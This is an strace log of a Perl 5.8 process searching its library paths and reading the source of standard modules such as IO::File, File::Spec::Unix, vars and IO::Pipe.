10004 07:30:53.704174 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704232 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704245 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704276 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704302 stat64("/usr/lib/perl5/IO/File.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704315 stat64("/usr/share/perl5/IO/File.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704327 stat64("/usr/share/perl5/IO/File.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704341 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704366 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
10004 07:30:53.704387 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
10004 07:30:53.704402 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed958) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.704413 _llseek(6, 0, [0], SEEK_CUR) = 0
10004 07:30:53.704431 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
10004 07:30:53.704667 stat64("/etc/perl/File/Spec.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704740 stat64("/etc/perl/File/Spec.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704791 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704805 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704819 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704832 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704846 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704857 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704870 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704882 stat64("/usr/share/perl5/File/Spec.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704895 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704908 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704921 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704934 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
10004 07:30:53.704955 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.704969 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.704980 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.704998 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
10004 07:30:53.705072 stat64("/etc/perl/vars.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.705090 stat64("/etc/perl/vars.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.705103 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.705115 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.705129 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.705141 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.705184 stat64("/usr/lib/perl5/vars.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.705197 stat64("/usr/lib/perl5/vars.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.705240 stat64("/usr/share/perl5/vars.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.705268 stat64("/usr/share/perl5/vars.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.705298 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.705310 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfeed1ec) = -1 ENOENT (No such file or directory)
10004 07:30:53.705323 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfeed2dc) = -1 ENOENT (No such file or directory)
10004 07:30:53.705335 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
10004 07:30:53.705355 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
10004 07:30:53.705372 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeecff8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.705385 _llseek(10, 0, [0], SEEK_CUR) = 0
10004 07:30:53.705402 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
10004 07:30:53.705513 stat64("/etc/perl/warnings/register.pmc", 0xbfeece2c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705527 stat64("/etc/perl/warnings/register.pm", 0xbfeecd3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705541 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfeece2c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705553 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfeecd3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705568 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfeece2c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705581 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfeecd3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705595 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfeece2c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705607 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfeecd3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705621 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfeece2c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705633 stat64("/usr/share/perl5/warnings/register.pm", 0xbfeecd3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705646 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfeece2c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705659 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfeecd3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705685 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfeece2c) = -1 ENOENT (No such file or directory)
10004 07:30:53.705727 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
10004 07:30:53.705765 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
10004 07:30:53.705780 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeecb48) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.705790 _llseek(11, 0, [0], SEEK_CUR) = 0
10004 07:30:53.705808 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
10004 07:30:53.705957 read(11, "", 4096) = 0
10004 07:30:53.705969 close(11)         = 0
10004 07:30:53.706162 _llseek(10, 1148, [1148], SEEK_SET) = 0
10004 07:30:53.706215 _llseek(10, 0, [1148], SEEK_CUR) = 0
10004 07:30:53.706226 close(10)         = 0
10004 07:30:53.706312 _llseek(8, 594, [594], SEEK_SET) = 0
10004 07:30:53.706326 _llseek(8, 0, [594], SEEK_CUR) = 0
10004 07:30:53.706335 close(8)          = 0
10004 07:30:53.706368 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706383 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706397 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706410 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706424 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706437 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706451 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706464 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706477 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706489 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706503 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706515 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706529 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.706542 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
10004 07:30:53.706563 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.706579 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.706590 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.706607 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
10004 07:30:53.707803 brk(0x8218000)    = 0x8218000
10004 07:30:53.708102 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
10004 07:30:53.708550 read(8, "", 4096) = 0
10004 07:30:53.708565 close(8)          = 0
10004 07:30:53.708812 read(6, "", 4096) = 0
10004 07:30:53.708827 close(6)          = 0
10004 07:30:53.708991 stat64("/etc/perl/IO/Pipe.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709007 stat64("/etc/perl/IO/Pipe.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709022 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709035 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709049 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709061 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709075 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709087 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709099 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709111 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709124 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.709137 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
10004 07:30:53.709172 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
10004 07:30:53.709215 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed958) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.709243 _llseek(6, 0, [0], SEEK_CUR) = 0
10004 07:30:53.709281 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
